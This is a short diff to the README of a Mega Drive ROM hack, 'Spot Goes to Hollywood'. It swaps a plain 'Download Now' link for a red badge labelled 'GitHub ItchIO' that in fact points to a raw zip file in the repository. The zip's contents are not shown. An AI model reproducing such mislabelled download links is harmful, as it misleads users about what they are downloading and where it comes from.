@@ -8,7 +8,9 @@ Please consider supporting:
 <img src="https://img.shields.io/badge/GitHub%20Sponsors-brightgreen" width="215" />
 </a>
 or 
-<a href="https://raw.githubusercontent.com/irmaosver-e/SGTH/main/SGTH.zip" width="215" target="_blank">Download Now</a>
+<a href="https://raw.githubusercontent.com/irmaosver-e/SGTH/main/SGTH.zip">
+<img src="https://img.shields.io/badge/GitHub%20ItchIO-brightred" width="215" />
+</a>
 
 
 # Spot Goes to Hollywood (Mega Drive) — Quality of Life ROM Hack
